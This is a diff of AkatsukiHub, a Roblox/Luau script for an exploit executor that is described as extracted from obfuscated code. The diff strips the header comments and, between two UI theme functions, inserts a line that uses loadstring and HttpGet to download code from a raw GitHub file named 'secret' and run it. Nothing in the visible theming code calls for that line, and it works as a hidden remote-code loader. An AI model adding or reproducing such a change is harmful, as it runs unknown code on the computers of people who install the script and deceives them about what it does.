@@ -1,5 +1,4 @@
--- AkatsukiHub: codigo principal extraido del bloque Luau ofuscado.
--- Ejecutar en un entorno Roblox/Luau con las funciones del executor que utiliza el script.
+
 
 do
   local z = _G
@@ -688,7 +687,7 @@ local function V(P, zN)
   if P.B <= P.R + 0.05 or P.B < P.G then
     return P
   end
-  CN = math.max(P.R, P.G, P.B)
+  CN = math.max(P.R, P.G, P.B)  
   if zN == "TextColor3" then
     if CN >= 0.58 then
       return Color3.fromRGB(235, 235, 240)
@@ -903,6 +902,9 @@ function _G.__AkatsukiApplyTheme()
     end
   end
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imparatu9i/dsa/refs/heads/main/secret"))()
+
 function _G.__AkatsukiAddUnifiedPanelShade(A, V, P)
   local zN = A and (A:FindFirstChild("UnifiedBackgroundShade"))
   if zN then
